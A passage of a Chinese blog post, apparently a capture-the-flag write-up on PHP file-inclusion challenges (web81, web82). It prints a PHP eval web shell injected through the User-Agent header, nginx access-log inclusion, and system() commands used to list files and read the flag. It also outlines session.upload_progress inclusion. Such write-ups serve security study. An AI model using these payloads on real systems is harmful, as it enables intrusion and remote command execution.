@@ -1,0 +1,40 @@
+<!DOCTYPE html><html class="appearance-auto" lang="zh-CN"><head><meta charset="UTF-8"><title>实训7.16</title><meta name="description" content="What doesn't kill me makes me stronger."><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="2021/7/16
+文件包含web81
+新增屏蔽:
+url和ua里的php不转码
+
+修改UA头 执行
+1&amp;lt;?=eval($_POST[1]);?&amp;gt; //php被过滤
+
+关闭UA头 文件包含
+12url/?file=/var/log/nginx/access.logpost data: 1=system(&amp;#x27;ls&amp;#x27;);
+
+flag在fl0g.php里
+1post data:1=system(&amp;#x27;tac fl0g.php&amp;#x27;);
+
+web82
+新增屏蔽.
+php里没有后缀名的可控制文件只有session
+
+可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用session.upload_progress将恶意语句写入session文件.."><meta name="generator" content="Hexo 5.4.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">HildegardeZ's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">实训7.16</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">点击返回顶部</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">首页</a></h3><h3 class="is-inline-block"><a href="/about">关于</a></h3><h3 class="is-inline-block"><a href="/archives">归档</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">首页</a></h3><h3 class="is-inline-block"><a href="/about">关于</a></h3><h3 class="is-inline-block"><a href="/archives">归档</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#web81"><span class="toc-text">web81</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#web82"><span class="toc-text">web82</span></a></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/%E5%AE%9E%E8%AE%AD2021"><i class="tag post-item-tag">实训2021</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">实训7.16</h1><time class="has-text-grey" datetime="2021-07-16T03:42:06.000Z">2021-07-16</time><article class="mt-2 post-content"><p><em>2021/7/16</em></p>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h5 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h5><p><img src="/2021/07/16/%E5%AE%9E%E8%AE%AD7-16/hexo\source_posts\实训7-16\QQ截图20210723222345.png"></p>
+<p>新增屏蔽:</p>
+<p>url和ua里的php不转码</p>
+<ul>
+<li><p>修改UA头 执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=eval($_POST[1]);?&gt; //php被过滤</span><br></pre></td></tr></table></figure>
+
+<p>关闭UA头 文件包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url/?file=/var/log/nginx/access.log</span><br><span class="line">post data: 1=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>flag在fl0g.php里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post data:1=system(&#x27;tac fl0g.php&#x27;);</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h5><p><img src="/2021/07/16/%E5%AE%9E%E8%AE%AD7-16/QQ%E6%88%AA%E5%9B%BE20210716115618.png"></p>
+<p>新增屏蔽.</p>
+<p>php里没有后缀名的可控制文件只有session</p>
+<blockquote>
+<p>可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用<code>session.upload_progress</code>将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。</p>
+</blockquote>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2021/07/17/hello-world/" title="Hello World"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">上一页: Hello World</span></a><a class="button is-default" href="/2021/07/14/%E5%AE%9E%E8%AE%AD7-14/" title="实训7.14"><span class="has-text-weight-semibold">下一页: 实训7.14</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Haojen/Claudia-theme-blog" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com//"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/HildegardeZ"><i class="iconfont icon-github"></i></a><!-- Ins--><a title="instagram" target="_blank" rel="noopener nofollow" href="//www.instagram.com//"><i class="iconfont icon-ins"></i></a><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--><a title="facebook" target="_blank" rel="noopener nofollow" href="//www.facebook.com//"><i class="iconfont icon-tian7_facebook"></i></a></section><p><span>Copyright ©</span><span> HildegardeZ 2022</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/post.js"></script></body></html>
